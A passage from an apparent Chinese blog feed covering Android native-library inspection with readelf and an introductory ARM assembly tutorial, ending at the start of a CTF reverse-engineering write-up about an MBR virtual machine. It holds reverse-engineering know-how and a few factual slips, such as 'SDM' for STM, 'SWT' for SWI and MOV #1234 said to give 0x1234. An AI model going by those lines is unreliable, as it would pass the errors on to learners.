class="line">  [ 4] .dynstr           STRTAB          00000380 000380 0001d3 00   A  0   0  1</span><br><span class="line">  [ 5] .gnu.hash         GNU_HASH        00000554 000554 00004c 04   A  3   0  4</span><br><span class="line">  [ 6] .<span class="built_in">hash</span>             HASH            000005a0 0005a0 0000b0 04   A  3   0  4</span><br><span class="line">  [ 7] .gnu.version      VERSYM          00000650 000650 000032 02   A  3   0  2</span><br><span class="line">  [ 8] .gnu.version_d    VERDEF          00000684 000684 00001c 00   A  4   1  4</span><br><span class="line">  [ 9] .gnu.version_r    VERNEED         000006a0 0006a0 000040 00   A  4   2  4</span><br><span class="line">  [10] .rel.dyn          REL             000006e0 0006e0 0000e8 08   A  3   0  4</span><br><span class="line">  [11] .rel.plt          REL             000007c8 0007c8 000088 08  AI  3  20  4</span><br><span class="line">  [12] .plt              PROGBITS        00000850 000850 0000e0 00  AX  0   0  4</span><br><span class="line">  [13] .text             PROGBITS        00000930 000930 0018c4 00  AX  0   0  4</span><br><span class="line">  [14] .ARM.exidx        ARM_EXIDX       000021f4 0021f4 0001b8 08  AL 13   0  4</span><br><span class="line">  [15] .ARM.extab        PROGBITS        000023ac 0023ac 0001a4 00   A  0   0  4</span><br><span class="line">  [16] .rodata           PROGBITS        00002550 002550 000566 01 AMS  0   0  1</span><br><span class="line">  [17] .fini_array       FINI_ARRAY      00003e3c 002e3c 000008 04  WA  0   0  4</span><br><span class="line">  [18] .data.rel.ro      PROGBITS        00003e44 002e44 000048 00  WA  0   0  4</span><br><span class="line">  [19] .dynamic          DYNAMIC         00003e8c 002e8c 000110 08  WA  4   0  4</span><br><span class="line">  [20] .got              PROGBITS        00003f9c 002f9c 000064 00  WA  0   0  4</span><br><span class="line">  [21] .data             PROGBITS        00004000 003000 000018 00  WA  0   0  4</span><br><span class="line">  [22] .bss              NOBITS          00004018 003018 000001 00  WA  0   0  1</span><br><span class="line">  [23] .comment          PROGBITS        00000000 003018 000109 01  MS  0   0  1</span><br><span class="line">  [24] .note.gnu.gold-ve NOTE            00000000 003124 00001c 00      0   0  4</span><br><span class="line">  [25] .ARM.attributes   ARM_ATTRIBUTES  00000000 003140 000034 00      0   0  1</span><br><span class="line">  [26] .shstrtab         STRTAB          00000000 003174 00010f 00      0   0  1</span><br><span class="line">Key to Flags:</span><br><span class="line">  W (write), A (alloc), X (execute), M (merge), S (strings)</span><br><span class="line">  I (info), L (link order), G (group), T (TLS), E (exclude), x (unknown)</span><br><span class="line">  O (extra OS processing required) o (OS specific), p (processor specific)</span><br></pre></td></tr></table></figure><p>显示符号表：</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br></pre></td><td class="code"><pre><span class="line">$ readelf -s libnative-lib.so</span><br><span class="line"></span><br><span class="line">Symbol table <span class="string">'.dynsym'</span> contains 25 entries:</span><br><span class="line">   Num:    Value  Size Type    Bind   Vis      Ndx Name</span><br><span class="line">     0: 00000000     0 NOTYPE  LOCAL  DEFAULT  UND</span><br><span class="line">     1: 00000000     0 FUNC    GLOBAL DEFAULT  UND __cxa_atexit@LIBC (2)</span><br><span class="line">     2: 00000000     0 FUNC    GLOBAL DEFAULT  UND __cxa_finalize@LIBC (2)</span><br><span class="line">     3: 00000000     0 OBJECT  GLOBAL DEFAULT  UND __stack_chk_guard@LIBC (2)</span><br><span class="line">     4: 00000000     0 FUNC    GLOBAL DEFAULT  UND __stack_chk_fail@LIBC (2)</span><br><span class="line">     5: 00000000     0 FUNC    GLOBAL DEFAULT  UND __android_log_print</span><br><span class="line">     6: 00000000     0 OBJECT  GLOBAL DEFAULT  UND __sF@LIBC (2)</span><br><span class="line">     7: 00000000     0 FUNC    GLOBAL DEFAULT  UND abort@LIBC (2)</span><br><span class="line">     8: 00000000     0 FUNC    GLOBAL DEFAULT  UND fflush@LIBC (2)</span><br><span class="line">     9: 00000000     0 FUNC    GLOBAL DEFAULT  UND fprintf@LIBC (2)</span><br><span class="line">    10: 00000000     0 FUNC    GLOBAL DEFAULT  UND dladdr@LIBC (3)</span><br><span class="line">    11: 00000000     0 FUNC    GLOBAL DEFAULT  UND __aeabi_memclr8</span><br><span class="line">    12: 00000000     0 FUNC    GLOBAL DEFAULT  UND __aeabi_memcpy</span><br><span class="line">    13: 00000000     0 FUNC    GLOBAL DEFAULT  UND __gnu_Unwind_Find_exidx</span><br><span class="line">    14: 00000000     0 FUNC    GLOBAL DEFAULT  UND snprintf@LIBC (2)</span><br><span class="line">    15: 00004018     0 NOTYPE  GLOBAL DEFAULT  ABS _edata</span><br><span class="line">    16: 00004019     0 NOTYPE  GLOBAL DEFAULT  ABS _end</span><br><span class="line">    17: 00000975    36 FUNC    GLOBAL DEFAULT   13 Java_com_assassinq_easycp</span><br><span class="line">    18: 00000999    44 FUNC    WEAK   DEFAULT   13 _ZN7_JNIEnv12NewStringUTF</span><br><span class="line">    19: 00000b87    72 FUNC    WEAK   DEFAULT   13 _ZN7_JNIEnv15RegisterNati</span><br><span class="line">    20: 00000b5d    42 FUNC    WEAK   DEFAULT   13 _ZN7_JNIEnv9FindClassEPKc</span><br><span class="line">    21: 00004018     0 NOTYPE  GLOBAL DEFAULT  ABS __bss_start</span><br><span class="line">    22: 000009e9   224 FUNC    GLOBAL DEFAULT   13 JNI_OnLoad</span><br><span class="line">    23: 00000ac9    52 FUNC    WEAK   DEFAULT   13 _ZN7_JavaVM6GetEnvEPPvi</span><br><span class="line">    24: 000009c5    36 FUNC    GLOBAL DEFAULT   13 sayHi</span><br></pre></td></tr></table></figure><p>显示 Dynamic Section：</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br></pre></td><td class="code"><pre><span class="line">$ readelf -d libnative-lib.so</span><br><span class="line"></span><br><span class="line">Dynamic section at offset 0x2e8c contains 29 entries:</span><br><span class="line">  Tag        Type                         Name/Value</span><br><span class="line"> 0x00000003 (PLTGOT)                     0x3fb0</span><br><span class="line"> 0x00000002 (PLTRELSZ)                   136 (bytes)</span><br><span class="line"> 0x00000017 (JMPREL)                     0x7c8</span><br><span class="line"> 0x00000014 (PLTREL)                     REL</span><br><span class="line"> 0x00000011 (REL)                        0x6e0</span><br><span class="line"> 0x00000012 (RELSZ)                      232 (bytes)</span><br><span class="line"> 0x00000013 (RELENT)                     8 (bytes)</span><br><span class="line"> 0x6ffffffa (RELCOUNT)                   26</span><br><span class="line"> 0x00000006 (SYMTAB)                     0x1f0</span><br><span class="line"> 0x0000000b (SYMENT)                     16 (bytes)</span><br><span class="line"> 0x00000005 (STRTAB)                     0x380</span><br><span class="line"> 0x0000000a (STRSZ)                      467 (bytes)</span><br><span class="line"> 0x6ffffef5 (GNU_HASH)                   0x554</span><br><span class="line"> 0x00000004 (HASH)                       0x5a0</span><br><span class="line"> 0x00000001 (NEEDED)                     Shared library: [liblog.so]</span><br><span class="line"> 0x00000001 (NEEDED)                     Shared library: [libm.so]</span><br><span class="line"> 0x00000001 (NEEDED)                     Shared library: [libdl.so]</span><br><span class="line"> 0x00000001 (NEEDED)                     Shared library: [libc.so]</span><br><span class="line"> 0x0000000e (SONAME)                     Library soname: [libnative-lib.so]</span><br><span class="line"> 0x0000001a (FINI_ARRAY)                 0x3e3c</span><br><span class="line"> 0x0000001c (FINI_ARRAYSZ)               8 (bytes)</span><br><span class="line"> 0x0000001e (FLAGS)                      BIND_NOW</span><br><span class="line"> 0x6ffffffb (FLAGS_1)                    Flags: NOW</span><br><span class="line"> 0x6ffffff0 (VERSYM)                     0x650</span><br><span class="line"> 0x6ffffffc (VERDEF)                     0x684</span><br><span class="line"> 0x6ffffffd (VERDEFNUM)                  1</span><br><span class="line"> 0x6ffffffe (VERNEED)                    0x6a0</span><br><span class="line"> 0x6fffffff (VERNEEDNUM)                 2</span><br><span class="line"> 0x00000000 (NULL)                       0x0</span><br></pre></td></tr></table></figure><h3 id="SO-Helper"><a href="#SO-Helper" class="headerlink" title="SO Helper"></a>SO Helper</h3><p>无名侠大佬开发的软件。可以用来快速地获取 so 文件的一些基本信息，提供较弱的汇编功能。</p><h1 id="ARM-汇编代码"><a href="#ARM-汇编代码" class="headerlink" title="ARM 汇编代码"></a>ARM 汇编代码</h1><p>ARM 是 ARM 公司的 32 位处理器，其汇编指令的机器码就是 32 位。</p><ol><li>ARM 汇编语言是一门“低级”语言可以和系统的底层相互沟通；</li><li>ARM 汇编语言编写的程序运行速度快，占用内存少；</li><li>ARM 编写的代码难懂，难以维护；</li><li>C 语言能实现的 ARM 汇编语言都能实现；</li><li>ARM 具有 31 个通用寄存器，6 个状态寄存器；</li><li>ARM 处理器支持 7 种运行模式。<ol><li>用户模式：ARM 处理器正常的程序执行状态。</li><li>快速中断模式：用于高速数据传输或通道处理。</li><li>外部中断模式：用于通用的中断处理。</li><li>管理模式：操作系统使用的保护模式。</li><li>数据访问终止模式：当数据或指令预取终止时进如该模式，可用于模拟存储及存储保护。</li><li>系统模式：运行具有特权的操作系统任务。</li><li>未定义指令中止模式：当未定义的指令执行时进入该模式。</li></ol></li></ol><blockquote><p>ARM 汇编难以分析的原因：IDA 自身的缺陷；函数库与类有时无法识别；自身对 ARM 汇编的熟练度。</p></blockquote><h2 id="函数参数传递"><a href="#函数参数传递" class="headerlink" title="函数参数传递"></a>函数参数传递</h2><p>遵循 ATPCS 规则，前 4 个参数使用 R0~R3 传递，剩余参数通过堆栈传递。</p><h2 id="ARM-和-Thumb"><a href="#ARM-和-Thumb" class="headerlink" title="ARM 和 Thumb"></a>ARM 和 Thumb</h2><p>Thumb 是 16 位的 ARM 汇编。一般地，ARM 每行代码占 4 个字节码，Thumb 每个指令占 2 个字节。两者不能混用，但可以通过 BX、BLX 等指令在跳转的时候实现切换。在动态调试的时候，IDA 对 ARM 和 Thumb 的分析会混淆，可以用 Alt+G 来修改相应的识别。</p><h2 id="ARM-寄存器"><a href="#ARM-寄存器" class="headerlink" title="ARM 寄存器"></a>ARM 寄存器</h2><ul><li>R0-R7：通用寄存器</li><li>R8-R10：不常用的通用寄存器</li><li>R11：基质寄存器（FP）</li><li>R12：暂时寄存器（IP）</li><li>R13：堆栈制作（SP）</li><li>R14：链接寄存器（LR）</li><li>CPSR：状态寄存器</li></ul><h2 id="ARM-指令"><a href="#ARM-指令" class="headerlink" title="ARM 指令"></a>ARM 指令</h2><h3 id="寄存器交互指令"><a href="#寄存器交互指令" class="headerlink" title="寄存器交互指令"></a>寄存器交互指令</h3><ul><li>LDR：从存储器中加载数据到寄存器。<ul><li><code>LDR R1, [R2]</code>：把 R2 指向的位置的数据给 R1</li></ul></li><li>STR：把寄存器的数据存储到存储器<ul><li><code>STR R1, [R2]</code>：在 R2 指向的地址，存储 R1</li></ul></li><li>LDM：将存储器的数据加载到一个寄存器列表。<ul><li><code>LDM R0, {R1, R2, R3}</code>：把 R0 中的数据一次加载到 R1、R2、R3</li></ul></li><li>SDM：将一个寄存器列表的数据存储到指定的存储器<ul><li><code>SDM R0, {R1, R2, R3}</code>：把 R1、R2、R3 加载到 R0 单元</li></ul></li><li>PUSH：入栈</li><li>POP：出栈</li></ul><h3 id="数据传送指令"><a href="#数据传送指令" class="headerlink" title="数据传送指令"></a>数据传送指令</h3><ul><li>MOV：将立即数或寄存器的数据传送到目标寄存器</li></ul><h3 id="数据算数运算指令"><a href="#数据算数运算指令" class="headerlink" title="数据算数运算指令"></a>数据算数运算指令</h3><h4 id="ADD（加法）"><a href="#ADD（加法）" class="headerlink" title="ADD（加法）"></a>ADD（加法）</h4><p>ADD 将把两个操作数加起来，把结果放置到目的寄存器中。操作数 1 是一个寄存器，操作数 2 可以是一个寄存器，被移位的寄存器，或一个立即值。</p><figure class="highlight arm"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">ADD </span><span class="built_in">R0</span>, <span class="built_in">R1</span>, <span class="built_in">R2</span> <span class="comment">@ R0 = R1 + R2</span></span><br><span class="line"><span class="keyword">ADD </span><span class="built_in">R0</span>, <span class="built_in">R1</span>, <span class="number">#256</span> <span class="comment">@ R0 = R1 + 256</span></span><br><span class="line"><span class="keyword">ADD </span><span class="built_in">R0</span>, <span class="built_in">R2</span>, <span class="built_in">R3</span>, <span class="keyword">LSL#1 </span><span class="comment">@ R0 = R2 + (R3 &lt;&lt; 1)</span></span><br></pre></td></tr></table></figure><p>加法可以在有符号和无符号数上进行。</p><ul><li>ADC：带进位的加法</li></ul><h4 id="SUB（减法）"><a href="#SUB（减法）" class="headerlink" title="SUB（减法）"></a>SUB（减法）</h4><p>SUB 用操作数 1 减去操作数 2，把结果放置到目的寄存器中。操作数 1 是一个寄存器，操作数 2 可以是一个寄存器，被移位的寄存器，或一个立即值。</p><figure class="highlight arm"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">SUB </span><span class="built_in">R0</span>, <span class="built_in">R1</span>, <span class="built_in">R2</span> <span class="comment">@ R0 = R1 - R2</span></span><br><span class="line"><span class="keyword">SUB </span><span class="built_in">R0</span>, <span class="built_in">R1</span>, <span class="number">#256</span> <span class="comment">@ R0 = R1 - 256</span></span><br><span class="line"><span class="keyword">SUB </span><span class="built_in">R0</span>, <span class="built_in">R2</span>, <span class="built_in">R3</span>, <span class="keyword">LSL#1 </span><span class="comment">@ R0 = R2 - (R3 &lt;&lt; 1)</span></span><br></pre></td></tr></table></figure><p>减法可以在有符号和无符号数上进行。</p><ul><li>SBC：带进位的减法</li></ul><h4 id="MUL（乘法）和-DIV（除法）"><a href="#MUL（乘法）和-DIV（除法）" class="headerlink" title="MUL（乘法）和 DIV（除法）"></a>MUL（乘法）和 DIV（除法）</h4><ul><li>给出的所有操作数、和目的寄存器必须为简单的寄存器。</li><li>不能对操作数 2 使用立即值或被移位的寄存器。</li><li>目的寄存器和操作数 1 必须是不同的寄存器。</li><li>不能指定 R15 为目的寄存器</li></ul><p>MUL 提供 32 位整数乘法。如果操作数是有符号的，可以假定结果也是有符号的。</p><ul><li>MLA：带累加的乘法</li></ul><p>除法指令 DIV 的条件与乘法类似。</p><ul><li>SDIV：带符号除法</li><li>UDIV：不带符号位除法</li></ul><h3 id="数据逻辑运算指令"><a href="#数据逻辑运算指令" class="headerlink" title="数据逻辑运算指令"></a>数据逻辑运算指令</h3><ul><li>AND：与</li><li>ORR：或</li><li>EOR：异或</li><li>LSL：逻辑左移</li><li>LSR：逻辑右移</li></ul><h3 id="比较指令"><a href="#比较指令" class="headerlink" title="比较指令"></a>比较指令</h3><ul><li>CMP：比较指令</li></ul><h3 id="其他指令"><a href="#其他指令" class="headerlink" title="其他指令"></a>其他指令</h3><ul><li>SWT：切换用户模式</li><li>DCB：伪指令</li></ul><h3 id="跳转指令"><a href="#跳转指令" class="headerlink" title="跳转指令"></a>跳转指令</h3><ul><li>B：无条件跳转</li><li>BL：带链接的无条件跳转</li><li>BLX：带状态的无条件跳转</li><li>BNE：不相等跳转</li><li>BEQ：相等跳转</li></ul><h4 id="偏移地址计算"><a href="#偏移地址计算" class="headerlink" title="偏移地址计算"></a>偏移地址计算</h4><ul><li>ARM：低 27 位是偏移位置<ul><li>偏移 = (目标地址 - 当前 PC 地址) / 指令长度</li><li>正数下跳，负数上跳</li></ul></li><li>Thumb 同理</li><li>目标地址 = 偏移 * 指令长度 + 当前偏移地址</li></ul><h2 id="ARM-代码编写"><a href="#ARM-代码编写" class="headerlink" title="ARM 代码编写"></a>ARM 代码编写</h2><p>处理器架构定义：</p><ul><li><code>.arch</code> 指定了 ARM 处理器架构。</li><li><code>armv5te</code> 表示本程序在 armv5te 架构处理器上运行。</li><li><code>.fpu</code> 指定了协处理器的类型。</li><li><code>softvfp</code> 表示使用浮点运算库来模拟协处理运算。</li><li><code>.ebi_attribute</code> 指定了一些接口属性。</li></ul><figure class="highlight arm"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="symbol">.arch</span> armv5te <span class="comment">@处理器架构</span></span><br><span class="line"><span class="symbol">.fpu</span> softvfp  <span class="comment">@协处理器类型</span></span><br><span class="line"><span class="symbol">.ebi_attribute</span> <span class="number">20</span>, <span class="number">1</span> <span class="comment">@接口属性</span></span><br><span class="line"><span class="symbol">.ebi_attribute</span> <span class="number">21</span>, <span class="number">1</span></span><br><span class="line"><span class="symbol">.ebi_attribute</span> <span class="number">23</span>, <span class="number">1</span></span><br><span class="line"><span class="symbol">.ebi_attribute</span> <span class="number">24</span>, <span class="number">1</span></span><br><span class="line"><span class="symbol">.ebi_attribute</span> <span class="number">25</span>, <span class="number">1</span></span><br><span class="line"><span class="symbol">.ebi_attribute</span> <span class="number">26</span>, <span class="number">1</span></span><br><span class="line"><span class="symbol">.ebi_attribute</span> <span class="number">30</span>, <span class="number">1</span></span><br><span class="line"><span class="symbol">.ebi_attribute</span> <span class="number">18</span>, <span class="number">1</span></span><br></pre></td></tr></table></figure><p>段定义：</p><ul><li><code>.section</code>：定义只读数据，属性是默认</li><li><code>.text</code>：定义了代码段。</li></ul><p>注释方法：</p><ul><li><code>/.../</code>：多行注释</li><li><code>@</code>：单行注释</li></ul><p>标号方式（和 8086 类似）：</p><figure class="highlight arm"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="symbol">loop</span>:</span><br><span class="line">    ...</span><br><span class="line"><span class="symbol">end</span> loop</span><br></pre></td></tr></table></figure><p>程序中所有以“.”开头的指令都是汇编指令，他们不属于 ARM 指令集：</p><ul><li>.file：制定了源文件名。</li><li>.align：代码对其方式。</li><li>.ascii：声明字符串。</li><li>.global：声明全局变量。</li><li>.type：指定符号的类型。</li></ul><p>声明函数的方法：</p><figure class="highlight arm"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="symbol">.global</span> 函数名</span><br><span class="line"><span class="symbol">.type</span> 函数名, %<span class="meta">function</span></span><br><span class="line">函数名:</span><br><span class="line">    &lt;...函数体...&gt;</span><br><span class="line">声明一个实现两个数相加的函数的代码</span><br><span class="line"><span class="symbol">.global</span> MyAdd</span><br><span class="line"><span class="symbol">.type</span> MyAdd, &amp;<span class="meta">function</span></span><br><span class="line"><span class="symbol">MyAdd</span>:</span><br><span class="line">    <span class="keyword">ADD </span><span class="built_in">R0</span>, <span class="built_in">R0</span>, <span class="built_in">R1</span></span><br><span class="line">    <span class="keyword">MOV </span><span class="built_in">PC</span>, <span class="built_in">LR</span></span><br></pre></td></tr></table></figure><h2 id="ARM-处理器寻址方式"><a href="#ARM-处理器寻址方式" class="headerlink" title="ARM 处理器寻址方式"></a>ARM 处理器寻址方式</h2><h3 id="立即寻址"><a href="#立即寻址" class="headerlink" title="立即寻址"></a>立即寻址</h3><figure class="highlight arm"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">@ 井号（#）作为前缀，表示16进制时以“0x”开头</span></span><br><span class="line"><span class="keyword">MOV </span><span class="built_in">R0</span>，<span class="number">#1234</span> <span class="comment">@ R0=0x1234</span></span><br></pre></td></tr></table></figure><h3 id="寄存器寻址"><a href="#寄存器寻址" class="headerlink" title="寄存器寻址"></a>寄存器寻址</h3><figure class="highlight arm"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">MOV </span><span class="built_in">R0</span>, <span class="built_in">R1</span> <span class="comment">@ R0=R1</span></span><br></pre></td></tr></table></figure><h3 id="寄存器移位寻址"><a href="#寄存器移位寻址" class="headerlink" title="寄存器移位寻址"></a>寄存器移位寻址</h3><p>五种移位操作：</p><ul><li>LSL：逻辑左移，移位后寄存器空出的低位补 0；</li><li>LSR：逻辑右移，移位后寄存器空出的高位补 0；</li><li>ASR：算数右移，移动过程中符号位不变。如果操作数是整数，则移位后空出的高位补 0，否则补 1；</li><li>ROR：循环右移，移位后移出的低位填入移位空出的高位；</li><li>RRX：带扩展的循环右移，操作数右移移位，移位空出的高位用 C 标志的值填充。</li></ul><figure class="highlight arm"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">MOV </span><span class="built_in">R0</span>, <span class="built_in">R1</span>, <span class="keyword">LSL#2 </span><span class="comment">@ R0=R1*4</span></span><br></pre></td></tr></table></figure><h3 id="寄存器间接寻址"><a href="#寄存器间接寻址" class="headerlink" title="寄存器间接寻址"></a>寄存器间接寻址</h3><figure class="highlight arm"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">LDR </span><span class="built_in">R0</span>，[<span class="built_in">R1</span>] <span class="comment">@ 将R1寄存器中的值作为地址，取出地址中的值赋予R0</span></span><br></pre></td></tr></table></figure><h3 id="寄存器间接基址偏移寻址"><a href="#寄存器间接基址偏移寻址" class="headerlink" title="寄存器间接基址偏移寻址"></a>寄存器间接基址偏移寻址</h3><figure class="highlight arm"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">LDR </span><span class="built_in">R0</span>, [<span class="built_in">R1</span>, #-<span class="number">4</span>] <span class="comment">@ 将R1寄存器的值-0x4的值作为地址，取出地址中的值给R0</span></span><br></pre></td></tr></table></figure><h3 id="多寄存器寻址"><a href="#多寄存器寻址" class="headerlink" title="多寄存器寻址"></a>多寄存器寻址</h3><figure class="highlight arm"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">@ LDM 是数据加载命令，指令的后缀IA表示每次执行完成加载操作后R0寄存器的值自增1</span></span><br><span class="line"><span class="keyword">LDMIA </span><span class="built_in">R0</span>, &#123;<span class="built_in">R1</span>, <span class="built_in">R2</span>, <span class="built_in">R3</span>, <span class="built_in">R4</span>&#125;</span><br><span class="line"><span class="comment">@ R1=[R0]</span></span><br><span class="line"><span class="comment">@ R2=[R0+#4]</span></span><br><span class="line"><span class="comment">@ R3=[R0+#8]</span></span><br><span class="line"><span class="comment">@ R4=[R0+#12]</span></span><br><span class="line"><span class="comment">@ ARM中，字表示的是一个32位。这里+#4的原因是因为32位占4个字节</span></span><br></pre></td></tr></table></figure><h3 id="堆栈寻址"><a href="#堆栈寻址" class="headerlink" title="堆栈寻址"></a>堆栈寻址</h3><figure class="highlight arm"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">STMFD </span><span class="built_in">SP</span>!, &#123;<span class="built_in">R1</span>-<span class="built_in">R7</span>, <span class="built_in">LR</span>&#125; <span class="comment">@ 入栈，多用于保存子程序堆栈</span></span><br><span class="line"><span class="keyword">LDMFD </span><span class="built_in">SP</span>!, &#123;<span class="built_in">R1</span>-<span class="built_in">R7</span>, <span class="built_in">LR</span>&#125; <span class="comment">@ 出栈，多用于恢复子程序堆栈</span></span><br></pre></td></tr></table></figure><h3 id="块拷贝寻址"><a href="#块拷贝寻址" class="headerlink" title="块拷贝寻址"></a>块拷贝寻址</h3><p>块拷贝可实现连续地址数据从存储器的某一位置拷贝到另一位置。</p><figure class="highlight arm"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">LDMIA </span><span class="built_in">R0</span>!, &#123;<span class="built_in">R1</span>-<span class="built_in">R3</span>&#125; <span class="comment">@ 从寄存器指向的存储单元中读取3个字到R1-R3寄存器。</span></span><br></pre></td></tr></table></figure><h3 id="相对寻址"><a href="#相对寻址" class="headerlink" title="相对寻址"></a>相对寻址</h3><p>相对寻址一程序计数器 PC 的当前值为基地址，指令中的地址标号作为偏移量，将两者相加之后得到的操作数的有效地址。</p><h1 id="References"><a href="#References" class="headerlink" title="References"></a>References</h1><p><a href="https://www.bilibili.com/video/av45424886" target="_blank" rel="noopener">https://www.bilibili.com/video/av45424886</a><br><a href="https://blog.csdn.net/miao_007/article/details/87632758" target="_blank" rel="noopener">https://blog.csdn.net/miao_007/article/details/87632758</a><br><a href="https://stackoverflow.com/questions/4629308/any-simple-way-to-log-in-android-ndk-code" target="_blank" rel="noopener">https://stackoverflow.com/questions/4629308/any-simple-way-to-log-in-android-ndk-code</a><br><a href="https://www.jianshu.com/p/acbf724fdcc9" target="_blank" rel="noopener">https://www.jianshu.com/p/acbf724fdcc9</a><br><a href="https://blog.csdn.net/afei__/article/details/81031965" target="_blank" rel="noopener">https://blog.csdn.net/afei__/article/details/81031965</a><br><a href="https://www.luoxudong.com/360.html" target="_blank" rel="noopener">https://www.luoxudong.com/360.html</a><br><a href="https://www.jianshu.com/p/23af9151837e" target="_blank" rel="noopener">https://www.jianshu.com/p/23af9151837e</a><br><a href="https://juejin.im/post/5afe28446fb9a07aa0483d0a" target="_blank" rel="noopener">https://juejin.im/post/5afe28446fb9a07aa0483d0a</a><br><a href="https://www.52pojie.cn/thread-699268-1-1.html" target="_blank" rel="noopener">https://www.52pojie.cn/thread-699268-1-1.html</a><br><a href="https://www.52pojie.cn/thread-673175-1-1.html" target="_blank" rel="noopener">https://www.52pojie.cn/thread-673175-1-1.html</a></p>]]></content>
    
    <summary type="html">
    
      &lt;p&gt;Android JNI 编程及 ARM 汇编入门。&lt;/p&gt;
    
    </summary>
    
    
    
      <category term="re" scheme="blog.b3ale.cn/tags/re/"/>
    
      <category term="android" scheme="blog.b3ale.cn/tags/android/"/>
    
  </entry>
  
  <entry>
    <title>2019-CISCN-strange_int</title>
    <link href="blog.b3ale.cn/2020/01/24/2019-CISCN-strange-int/"/>
    <id>blog.b3ale.cn/2020/01/24/2019-CISCN-strange-int/</id>
    <published>2020-01-24T08:46:38.000Z</published>
    <updated>2020-01-27T03:42:36.631Z</updated>
    
    <content type="html"><![CDATA[<p>一道 MBR 虚拟机的题目，同时也熟悉了使用 bochs 对 MBR 的调试。</p><a id="more"></a><h1 id="Analysis"><a href="#Analysis" class="headerlink" title="Analysis"></a>Analysis</h1><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">$ file Image.bin</span><br><span class="line">Image.bin: DOS/MBR boot sector</span><br></pre></td></tr></table></figure><p>先在 IDA 中 16 位的模式打开。在 7C00~7C0E 的代码（MBR 的加载地址是 0x7C00 处）是对寄存器和栈指针进行初始化操作；在 7C0F~7C12 的代码是 x86 系统中的第 17 号调用，设置了显示模式；在 7C14~7C24 的代码是 x86 系统中的第 20 号调用，从软盘的第 0 个磁盘第 0 个柱面第 2 个扇区开始的共 28 个扇区读取数据到内存的 10000000 处；在 7C2B~7C3B 的代码将内存中 10000000~10002000 的数据赋值给内存 0~2000 处；在 7C3D~7C47 的代码初始化 IDT 和 GDT；在 7C4C~7C52 的代码处，启动保护模式，并跳转至 32 位代码段：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span 